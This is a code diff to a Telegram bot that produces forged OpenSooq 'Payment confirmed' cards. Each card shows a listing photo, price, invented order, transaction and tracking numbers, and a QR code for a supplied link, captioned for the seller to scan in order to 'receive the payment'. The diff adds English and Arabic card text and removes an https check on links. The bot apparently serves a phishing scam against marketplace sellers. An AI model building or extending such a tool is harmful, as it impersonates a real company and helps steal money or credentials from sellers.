@@ -17,8 +17,8 @@ from bidi.algorithm import get_display
 from bs4 import BeautifulSoup
 from PIL import Image, ImageDraw, ImageFont, ImageOps
 
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler
 
 # --- НАСТРОЙКИ ---
 TOKEN = os.environ.get("TOKEN")
@@ -34,11 +34,55 @@ BG_COLOR = "#FCFDFD"
 QR_EYE_COLOR = "#0DEF05" 
 QR_DOT_COLOR = "#64748B" 
 
-WAITING_PRICE, WAITING_NAME = range(2)
+WAITING_PRICE, WAITING_NAME, WAITING_LANG = range(3)
 
 # --- ХРАНИЛИЩЕ ДЛЯ СТАТИСТИКИ ---
 REGISTERED_USERS = {}
 RECENT_LINKS = []
+
+# --- СЛОВАРИ ДЛЯ ПЕРЕВОДОВ ---
+TRANSLATIONS = {
+    "EN": {
+        "payment_confirmed": "Payment confirmed",
+        "payment_secure": "Your payment has been secured.",
+        "order": "Order #",
+        "processing": "Processing",
+        "transaction_id": "Transaction ID",
+        "tracking_number": "Tracking Number",
+        "delivery_status": "Delivery Status",
+        "in_progress": "In progress",
+        "waiting_seller": "Waiting for the seller\nto receive the funds",
+        "seller_confirmed": "Seller confirmed",
+        "preparing": "Preparing shipment",
+        "courier": "Courier pickup",
+        "protected": "Protected by OpenSooq",
+        "protected_text": "Your payment is secure and protected until you receive your order.",
+        "help": "(i) Need help? Visit our Help Center or contact support.",
+        "qr_text": "Send this QR code\nto the seller so they can\nreceive the payment.",
+        "no_photo": "NO PHOTO",
+        "price_not_avail": "Price not available"
+    },
+    "AR": {
+        "payment_confirmed": "تم تأكيد الدفع",
+        "payment_secure": "تم تأمين دفعتك.",
+        "order": "طلب #",
+        "processing": "قيد المعالجة",
+        "transaction_id": "معرف المعاملة",
+        "tracking_number": "رقم التتبع",
+        "delivery_status": "حالة التوصيل",
+        "in_progress": "قيد التقدم",
+        "waiting_seller": "في انتظار البائع\nلاستلام الأموال",
+        "seller_confirmed": "تم تأكيد البائع",
+        "preparing": "تحضير الشحنة",
+        "courier": "استلام البريد",
+        "protected": "محمي بواسطة OpenSooq",
+        "protected_text": "دفعتك آمنة ومحمية حتى تستلم طلبك.",
+        "help": "(i) بحاجة لمساعدة؟ زر مركز المساعدة أو اتصل بالدعم.",
+        "qr_text": "أرسل رمز الاستجابة السريعة هذا\nإلى البائع حتى يتمكن\nمن استلام الدفعة.",
+        "no_photo": "لا توجد صورة",
+        "price_not_avail": "السعر غير متوفر"
+    }
+}
 
 # --- ЛОГИКА ---
 def font(size, bold=False):
@@ -47,10 +91,6 @@ def font(size, bold=False):
         return ImageFont.truetype(path, size)
     except:
         return ImageFont.load_default(size=size)
-
-def validate_link(link):
-    if urlparse(link).scheme != "https":
-        raise ValueError("Только https")
 
 def get_meta(soup, name):
     tag = soup.find("meta", property=name) or soup.find("meta", attrs={"name": name})
@@ -166,7 +206,8 @@ def generate_new_qr(data, size=230):
     draw_eye(0, actual_size - box_size * 7)
     return img
 
-def make_card(data):
+def make_card(data, lang="EN"):
+    t = TRANSLATIONS[lang]
     W, H = 1000, 1450 
     image = Image.new("RGB", (W, H), BG_COLOR)
     draw = ImageDraw.Draw(image)
@@ -175,16 +216,22 @@ def make_card(data):
         cx, cy = x + size//2, y + size//2
         draw.line((cx-15, cy, cx-5, cy+10), fill="white", width=6)
         draw.line((cx-5, cy+10, cx+15, cy-10), fill="white", width=6)
+    
     draw.rounded_rectangle((40, 40, W-40, 160), radius=20, fill=LIGHT_GREEN)
     draw_check_icon(70, 65, 70, GREEN)
-    draw.text((160, 70), "Payment confirmed", font=font(36, True), fill=NAVY)
-    draw.text((160, 115), "Your payment has been secured.", font=font(24), fill=GRAY)
+    
+    # Текст заголовка (с поддержкой арабского)
+    draw.text((160, 70), prepare_text(t["payment_confirmed"]), font=font(36, True), fill=NAVY)
+    draw.text((160, 115), prepare_text(t["payment_secure"]), font=font(24), fill=GRAY)
     draw.text((W-80, 90), ">", font=font(40, True), fill=GRAY)
+    
     draw.rounded_rectangle((40, 190, W-40, 850), radius=20, fill="white", outline=BORDER, width=2)
-    draw.text((70, 220), "Order #", font=font(24), fill=GRAY)
+    draw.text((70, 220), t["order"], font=font(24), fill=GRAY)
     draw.text((70, 250), data["order_id"], font=font(55, True), fill=NAVY)
+    
     draw.rounded_rectangle((70, 320, 240, 365), radius=15, fill="#D1F2D8")
-    draw.text((95, 328), "Processing", font=font(24, True), fill="#1E7D32")
+    draw.text((95, 328), prepare_text(t["processing"]), font=font(24, True), fill="#1E7D32")
+    
     if data["image"]:
         img = ImageOps.fit(data["image"], (220, 220), Image.Resampling.LANCZOS)
         mask = Image.new("L", img.size, 0)
@@ -192,62 +239,73 @@ def make_card(data):
         image.paste(img, (70, 400), mask)
     else:
         draw.rounded_rectangle((70, 400, 290, 620), radius=15, fill="#E9EFF5")
-        draw.text((130, 500), "NO PHOTO", font=font(20, True), fill=GRAY)
+        draw.text((130, 500), t["no_photo"], font=font(20, True), fill=GRAY)
+    
     title, t_font = fit_text(draw, data["title"], 310, 26)
     draw.text((320, 410), title, font=t_font, fill=NAVY)
     
-    # ИСПРАВЛЕНО: Убрали принудительный KWD
     curr = data['currency'] if data['currency'] else ""
-    price_str = f"{data['price']} {curr}" if data["price"] else "Price not available"
+    price_str = f"{data['price']} {curr}" if data["price"] else t["price_not_avail"]
     draw.text((320, 480), price_str, font=font(45, True), fill=NAVY)
     
     draw.rounded_rectangle((630, 210, 930, 640), radius=20, fill="#F8FAFC", outline=BORDER, width=2)
     qr_img = generate_new_qr(data["url"], size=230) 
     image.paste(qr_img, (665, 240), qr_img) 
-    text_qr = "Send this QR code\nto the seller so they can\nreceive the payment."
-    draw.multiline_text((780, 495), text_qr, font=font(18), fill=GRAY, align="center", anchor="ma", spacing=4)
+    
+    draw.multiline_text((780, 495), prepare_text(t["qr_text"]), font=font(18), fill=GRAY, align="center", anchor="ma", spacing=4)
     draw.line((70, 650, W-70, 650), fill=BORDER, width=2)
+    
     draw.rounded_rectangle((70, 690, 120, 725), radius=5, outline=GRAY, width=4)
     draw.line((70, 700, 120, 700), fill=GRAY, width=4)
-    draw.text((140, 680), "Transaction ID", font=font(22), fill=GRAY)
+    draw.text((140, 680), prepare_text(t["transaction_id"]), font=font(22), fill=GRAY)
     draw.text((140, 710), data["trans_id"], font=font(32, True), fill=NAVY)
+    
     truck_x, truck_y = 530, 690
     draw.rectangle((truck_x, truck_y + 10, truck_x + 40, truck_y + 40), outline=GRAY, width=4)
     draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=GRAY, width=4)
     draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=GRAY)
     draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=GRAY)
-    draw.text((610, 680), "Tracking Number", font=font(22), fill=GRAY)
+    
+    draw.text((610, 680), prepare_text(t["tracking_number"]), font=font(22), fill=GRAY)
     draw.text((610, 710), data["track_id"], font=font(32, True), fill=NAVY)
+    
     draw.rounded_rectangle((40, 880, W-40, 1130), radius=20, fill="white", outline=BORDER, width=2)
     truck_x, truck_y = 70, 910
     draw.rectangle((truck_x, truck_y + 10, truck_x + 40, truck_y + 40), outline=NAVY, width=4)
     draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=NAVY, width=4)
     draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=NAVY)
     draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=NAVY)
-    draw.text((150, 910), "Delivery Status", font=font(34, True), fill=NAVY)
+    
+    draw.text((150, 910), prepare_text(t["delivery_status"]), font=font(34, True), fill=NAVY)
+    
     draw.rounded_rectangle((750, 905, 930, 950), radius=15, fill="#D1F2D8")
-    draw.text((780, 915), "In progress", font=font(22, True), fill="#1E7D32")
+    draw.text((780, 915), prepare_text(t["in_progress"]), font=font(22, True), fill="#1E7D32")
+    
     line_y = 1010
     points = [100, 330, 560, 790]
     draw.line((points[0], line_y, points[-1], line_y), fill=BORDER, width=4)
     draw.line((points[0], line_y, points[1], line_y), fill=GREEN, width=4)
-    labels = ["Waiting for the seller\nto receive the funds", "Seller confirmed", "Preparing shipment", "Courier pickup"]
+    
+    labels = [t["waiting_seller"], t["seller_confirmed"], t["preparing"], t["courier"]]
     for i, p in enumerate(points):
         if i == 0:
             draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill=GREEN)
             draw.line((p-8, line_y, p-2, line_y+8), fill="white", width=4)
             draw.line((p-2, line_y+8, p+10, line_y-8), fill="white", width=4)
-            draw.text((p-60, line_y+35), labels[i], font=font(18), fill=NAVY)
+            draw.text((p-60, line_y+35), prepare_text(labels[i]), font=font(18), fill=NAVY)
         else:
             draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill="white", outline=BORDER, width=3)
-            draw.text((p-80, line_y+35), labels[i], font=font(18), fill=GRAY)
+            draw.text((p-80, line_y+35), prepare_text(labels[i]), font=font(18), fill=GRAY)
+            
     draw.rounded_rectangle((40, 1160, W-40, 1280), radius=20, fill="white", outline=BORDER, width=2)
     draw_check_icon(70, 1185, 60, GREEN)
-    draw.text((150, 1185), "Protected by OpenSooq", font=font(30, True), fill=NAVY)
-    draw.text((150, 1225), "Your payment is secure and protected until you receive your order.", font=font(20), fill=GRAY)
+    draw.text((150, 1185), prepare_text(t["protected"]), font=font(30, True), fill=NAVY)
+    draw.text((150, 1225), prepare_text(t["protected_text"]), font=font(20), fill=GRAY)
     draw.text((W-80, 1200), ">", font=font(40, True), fill=GRAY)
+    
     draw.rounded_rectangle((40, 1310, W-40, 1390), radius=15, fill="#F0F4F8")
-    draw.text((70, 1335), "(i) Need help? Visit our Help Center or contact support.", font=font(22), fill=GRAY)
+    draw.text((70, 1335), prepare_text(t["help"]), font=font(22), fill=GRAY)
+    
     output = io.BytesIO()
     image.save(output, format="PNG")
     output.seek(0)
@@ -355,7 +413,6 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     if text != "/skip":
-        # ИСПРАВЛЕНО: Добавили все валюты
         match = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QR|RUB|EUR)", text, re.IGNORECASE)
         if match:
             context.user_data["card_data"]["price"] = match.group(1)
@@ -370,37 +427,76 @@ async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     if text != "/skip": context.user_data["card_data"]["title"] = text
     data = context.user_data["card_data"]
+    
     if data["image"]:
-        await update.message.reply_text("Собираю карточку...")
-        card = await asyncio.to_thread(make_card, data)
-        await update.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
-        return ConversationHandler.END
+        # Вместо генерации сразу, показываем кнопки выбора языка
+        keyboard = [
+            [
+                InlineKeyboardButton("🇬🇧 English", callback_data="lang_EN"),
+                InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_AR")
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text("Выбери язык для карточки:", reply_markup=reply_markup)
+        return WAITING_LANG
     else:
         await update.message.reply_text("⚠️ Фото нет. Отправь картинку.")
         return ConversationHandler.END
+
+async def lang_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    lang = query.data.split("_")[1] # EN или AR
+    data = context.user_data["card_data"]
+    
+    await query.edit_message_text(text="Собираю карточку...")
+    
+    try:
+        card = await asyncio.to_thread(make_card, data, lang)
+        await query.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
+    except Exception as e:
+        await query.message.reply_text(f"ОШИБКА:\n{e}")
+        
+    context.user_data["card_data"] = None
+    return ConversationHandler.END
 
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id in get_blocked_list(): return
     if not context.user_data.get("authorized"): return
     data = context.user_data.get("card_data")
     if not data: return
-    await update.message.reply_text("Фото получено! Собираю карточку...")
+    
     try:
         photo_file = await update.message.photo[-1].get_file()
         photo_bytes = await photo_file.download_as_bytearray()
         data["image"] = Image.open(io.BytesIO(photo_bytes)).convert("RGB")
-        card = await asyncio.to_thread(make_card, data)
-        await update.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
-        context.user_data["card_data"] = None
+        
+        # После загрузки фото тоже показываем кнопки
+        keyboard = [
+            [
+                InlineKeyboardButton("🇬🇧 English", callback_data="lang_EN"),
+                InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_AR")
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text("Фото получено. Выбери язык для карточки:", reply_markup=reply_markup)
+        return WAITING_LANG
+        
     except Exception as e:
         await update.message.reply_text(f"ОШИБКА:\n{e}")
+        return ConversationHandler.END
 
 async def run_bot():
     bot_app = Application.builder().token(TOKEN).build()
     
     conv_handler = ConversationHandler(
         entry_points=[MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link)],
-        states={WAITING_PRICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)], WAITING_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)]},
+        states={
+            WAITING_PRICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)],
+            WAITING_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
+            WAITING_LANG: [CallbackQueryHandler(lang_choice, pattern="^lang_")]
+        },
         fallbacks=[CommandHandler("start", start)]
     )
     bot_app.add_handler(CommandHandler("block", block_command))
@@ -414,7 +510,7 @@ async def run_bot():
     await bot_app.initialize()
     await bot_app.start()
     await bot_app.updater.start_polling()
-    print("✅ БОТ ЗАПУЩЕН (Polling mode)")
+    print("✅ БОТ ЗАПУЩЕН (с выбором языка)")
 
 if __name__ == "__main__":
     def start_bot_thread():
